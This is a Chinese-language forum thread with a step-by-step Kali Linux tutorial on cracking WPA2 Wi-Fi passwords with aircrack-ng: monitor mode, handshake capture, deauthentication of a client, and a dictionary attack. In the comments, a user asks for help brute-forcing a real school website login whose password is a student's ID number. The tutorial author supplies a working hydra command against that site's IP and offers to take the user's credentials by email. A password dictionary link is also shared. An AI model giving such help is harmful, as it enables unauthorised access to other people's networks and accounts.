# Kali linux 下使用 Aircrack-ng 对于 wifi 暴力破解教程

# **暴力破解概述**

1. 穷举法是一种针对于密码的破译方法。这种方法很像数学上的“完全归纳法”并在密码破译方面得到了广泛的应用。简单来说就是将密码进行逐个推算直到找出真正的密码为止。比如一个四位并且全部由数字组成其密码共有10000种组合，也就是说最多我们会尝试9999次才能找到真正的密码。利用这种方法我们可以运用计算机来进行逐个推算，也就是说用我们破解任何一个密码也都只是一个时间问题
2. 当然如果破译一个有8位而且有可能拥有大小写字母、数字、以及符号的密码用普通的家用电脑可能会用掉几个月甚至更多的时间去计算，其组合方法可能有几千万亿种组合。这样长的时间显然是不能接受的。其解决办法就是运用字典，所谓“字典”就是给密码锁定某个范围，比如英文单词以及生日的数字组合等，所有的英文单词不过10万个左右这样可以大大缩小密码范围，很大程度上缩短了破译时间

# **破解wifi密码操作步骤**

需要最少两个终端来实现，以下分别称之为shell 1 和shell 2

- Shell 1 通过aircrack-ng 工具，将网卡改为监听模式
- Shell 1 确定目标WiFi 的信息，比如mac 地址和信道，连接数等等
- Shell 2 模拟无线，抓取密码信息
- Shell 1 确定目标用户，对其发动攻击
- Shell 2 得到加密的无线信息并进行破解(通过密码字典)

步骤就是这样了，接下来我来破解下自己的WiFi

# **WiFi密码破解步骤演示**

- **开启无线网卡的监听模式，电脑内置的或者外置的都可以**

root@kali:~# airmon-ng start wlan0

[https://www.notion.so//note.youdao.com/src/BB03AFF4C1014E10A3191B36BCE7C1AE](https://www.notion.so//note.youdao.com/src/BB03AFF4C1014E10A3191B36BCE7C1AE)

这里要注意的，在开启监听模式之后，wlan0 这个网卡名称现在叫wlan0mon(偶尔也会不变，具体叫什么看上图的提示)

- **扫描目标WiFi**

root@kali:~# airodump-ng wlan0mon

[https://www.notion.so//note.youdao.com/src/51C497AC167146ECBA2B75C9CACCCC3A](https://www.notion.so//note.youdao.com/src/51C497AC167146ECBA2B75C9CACCCC3A)

注意现在的连个方框（红色和蓝色区域），现在我们要确认一些信息，及目标AP（就是WiFi，以下简称AP） 的MAC 地址，AP 的信道和加密方式，还有目标用户的MAC地址，我们稍微整理一下：

蓝色区域：目标AP的MAC地址（WiFi路由器的）

红色区域：目标用户的MAC地址（我的手机的）

CH（信道）：1

加密方式：WPA2

我们只需要这些信息就足够了

- **模拟WiFi 信号**

root@kali:~# airodump-ng --ivs -w wifi-pass --bssid 1C:60:DE:77:B9:C0 -c 1 wlan0mon

[https://www.notion.so//note.youdao.com/src/65EFBA74D76947C0BE84FFBA3C09CAE4](https://www.notion.so//note.youdao.com/src/65EFBA74D76947C0BE84FFBA3C09CAE4)

–ivs ：指定生成文件的格式，这里格式是ivs（比如：abc.ivs）

- w ：指定文件的名称叫什么，这里叫wifi-pass

–bssid ：目标AP的MAC地址，就是之前蓝色区域的

- c ：指定我们模拟的WiFi的信道，这里是1

敲下回车后会看到这样的一段信息，这就说明我们模拟的WiFi 已经开始抓取指定文件了，不过要注意红色箭头的位置，如果想这样一直是空的就是没有抓到需要的信息，如果抓到了看下图，可以对比出来

- **攻击指定的用户**

这里使用另一个空闲的终端，执行以下命令

root@kali:~# aireplay-ng -0 20 -a 1C:60:DE:77:B9:C0 -c 18:E2:9F:B0:8B:37 wlan0mon

[https://www.notion.so//note.youdao.com/src/8CDBEF4086EE4A59B34B2B50A7425907](https://www.notion.so//note.youdao.com/src/8CDBEF4086EE4A59B34B2B50A7425907)

- 0 ：发送工具数据包的数量，这里是20个
- a ：指定目标AP的MAC地址
- c ：指定用户的MAC地址，（正在使用WiFi的我的手机）

攻击开始后就像这样～

- **得到密码文件并破解**

[https://www.notion.so//note.youdao.com/src/9585D0742B004498B373C70F4306DDB9](https://www.notion.so//note.youdao.com/src/9585D0742B004498B373C70F4306DDB9)

注意红色箭头指向的位置，如果在发送攻击数据包之后出现了图片里的信息，那么就是密码信息抓取成功了，如果出现了这个的话就可以结束WiFi 模拟了，我们可以按Ctrl+C 然后查看当前目录会发现多了一个wifi-pass-01.ivs 文件，我们想要的密码就在这个文件里，不过是加密的，所有我们还需要通过密码字典把密码破解出来

- **指定密码本来破解此文件**

root@kali:~# aircrack-ng wifi-pass-01.ivs -w /root/pass-heji.txt

[https://www.notion.so//note.youdao.com/src/49320DE5126545A88B3A49A8C2F00772](https://www.notion.so//note.youdao.com/src/49320DE5126545A88B3A49A8C2F00772)

- w ： 指定密码字典（比如我的在/root下，所有多了绝对路径）

这里看到红色箭头的位置就是密码了，到这里密码破解就完成了~

- [kikipu](https://freeerror.org/u/kikipu), [凌f绝](https://freeerror.org/u/%E5%87%8Cf%E7%BB%9D) 以及 [DeadAndLive](https://freeerror.org/u/DeadAndLive) 赞了
- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-09-09 11:55:47
- [最佳回复](https://freeerror.org/d/161-kali-linux-aircrack-ng-wifi/3)由 [已注销] 选择

能否抓取到相关文件还是看目标用户是否活跃，路由器本身的工作机制都是一样的，你在选择目标的时候优先选择数据流量大，信号强度高的目标

我的密码字典可以在这里下载

[https://freeerror.org/assets/files/2018-09-09/zhzy-pass.zip](https://freeerror.org/assets/files/2018-09-09/zhzy-pass.zip)

# [L**lightning1918**](https://freeerror.org/u/lightning1918)

- 2018-09-09 01:29:10

感谢分享，不过遇到了两个问题，有的wifi怎么攻击都抓不到文件，不知道是笔记本网卡有问题，还是无线路由器的问题。还有就是能否分享一下密码小本本。

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-09-09 11:55:47
- 已编辑
- 最佳回复由 [已注销] 选择

能否抓取到相关文件还是看目标用户是否活跃，路由器本身的工作机制都是一样的，你在选择目标的时候优先选择数据流量大，信号强度高的目标

我的密码字典可以在这里下载

[https://freeerror.org/assets/files/2018-09-09/zhzy-pass.zip](https://freeerror.org/assets/files/2018-09-09/zhzy-pass.zip)

**1 个月后**

# [F**fesssw**](https://freeerror.org/u/fesssw)

- 2018-10-21 18:22:48

攻击时总是说信道不同

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-10-21 18:35:44

在某个命令中需要指定信道的，另外可以的话把你的命令贴一下吧，包括错提示

**7 天后**

# [F**fesssw**](https://freeerror.org/u/fesssw)

- 2018-10-28 17:04:52

[https://www.notion.so//note.youdao.com/src/24DA578D735246A0A877DB8952C5471B](https://www.notion.so//note.youdao.com/src/24DA578D735246A0A877DB8952C5471B)

就是这样

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-10-30 08:15:39

在这里

root@kali:~# airodump-ng --ivs -w wifi-pass --bssid 1C:60:DE:77:B9:C0 -c 1 wlan0mon

- c :指定的你目标信道，根据你的图片是说目标ap（路由器）工作在信道10，但是你指定的是信道1

**18 天后**

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 14:00:22

HEY zhzy 我有問題 關於hrydra

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 14:02:58
- 已编辑

你可以在发表一个帖子，或者直接问吧

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 14:06:17

这是我要暴力破解的网址>> [http://register2.elvs.chc.edu.tw/winrh/](http://register2.elvs.chc.edu.tw/winrh/)

这是我的指令>>

hydra -l 511106 -P“C：\ Users \ jj lin \ Desktop \ thc-hydra-windows-master \ 5566.txt”-vV -t 10 -f 163.23.157.112 http-post-form“/ winrh /：account=^ USER＆密码= PASS＆submit2n：S = TOP_TITLE”

她错误会跳出错误框所以我用白名单作为判断条件，但是我不知道如何做白名單的判斷。以上是学校的网站，密码是身

帳號是學號

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 14:08:30

你稍等下，我尝试一些代码命令，随后在发给你，可能5-20分钟

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 14:10:45
- 已编辑

[https://www.notion.so//note.youdao.com/src/EE79C58228B54B2680BFCD272B5462DC](https://www.notion.so//note.youdao.com/src/EE79C58228B54B2680BFCD272B5462DC)

這是密碼錯誤的時候

@zhzy

#433 大神倘若需要登入成功的帳號密碼告訴我，因為這是學校網站，不提供註冊。在這邊謝謝大神因為我花了4天了一直找不到原因

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 14:26:53

命令就是这样的了

hydra -l admin -P Tools/zhzy-pass.txt -vV -t 1 -e ns -f -I 163.23.157.112  http-post-form "/winrh/:Account=^USER^&Password=^PASS^&submit2=submit2:F=帳號或密碼錯誤,請再重輸入一次...如有問題請洽電腦中心!!"

弹出的框可以当作F黑名单来使用，不过....我的系统似乎无法在命令行执行繁体字，它会产生格式错误，

不知道你哪里会不会有什么问题？

- [abcd6900](https://freeerror.org/u/abcd6900) 赞了

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 14:44:26

@ zhzy＃440我已经知道帐号，帐号是511106

密码不知道，密码不是空的。

密码是身分证

hydra -l 511106 -P“C：\ Users \ jj lin \ Desktop \ thc-hydra-windows-master \ 5566.txt”-vV -t 10 -f 163.23.157.112 http-post-form“/ winrh /：account = ^ USER ＆Password = ^ PASS ＆submit2 = submit2：F =帐号或密码错误，请再重输入一次...如有问题请洽电脑中心!!“

他的成功破解并不是真正的密码，txt档里有放正确的密码但都不会跳出来，都跳别的密码

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 14:46:53

跳别的是因为，黑白名单设置的原因，比如网站弹出的是繁体，那么你写简体的话一样是不行的，

我不我的终端里没有办法跑繁体～

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 14:49:59

我的是繁體的但還是一樣不行

[https://www.notion.so//note.youdao.com/src/2A36C74BB7694F66BC41F0B55839CFAC](https://www.notion.so//note.youdao.com/src/2A36C74BB7694F66BC41F0B55839CFAC)

- I是甚麼?
- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 14:57:25

可以登录的话尝试白名单试试吧，我解决一下语言格式的问题

# [M**m4d93aaa**](https://freeerror.org/u/m4d93aaa)

- 2018-11-17 15:00:44

這是學校網站，所以學校不提供註冊，但我有帳號密碼需要提供給您嘛?[reply] [/reply]

- **[zhzy](https://freeerror.org/u/zhzy)**
- 2018-11-17 16:13:20

[2227045177@qq.com](https://freeerror.org/d/mailto:2227045177@qq.com)

发我邮箱吧，有时间尝试看看

**14 天后**

# [X**Xingming**](https://freeerror.org/u/Xingming)

- 2018-12-02 00:52:27

为什么试了好几次都显示没有ssid，旁边3个WiFi，一个显示都没有